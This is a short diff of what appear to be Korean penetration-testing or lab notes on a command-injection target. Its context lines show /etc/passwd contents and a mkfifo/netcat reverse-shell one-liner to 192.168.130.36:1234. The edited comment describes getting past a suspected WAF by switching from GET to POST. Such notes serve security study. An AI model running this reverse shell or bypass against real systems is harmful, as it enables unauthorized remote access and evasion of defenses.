@@ -299,7 +299,7 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 
 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.36 1234 >/tmp/f -> X
 
-# 무슨 원인인지 모르겠으나 queryParam 으로 보내면? 안 됨! -> ICMP 는 잘 됨 -> GET 방식은 WAF 에서 필터링 처리로 의심 -> 우회하기 -> POST 방식으로 전환
+# 무슨 원인인지 모르겠으나 queryParam 으로 보내면? 되지 않음! -> ICMP 는 잘 됨 -> GET 방식은 WAF 에서 필터링 처리로 의심 -> 우회하기 -> POST 방식으로 전환
 
 pwd 
 
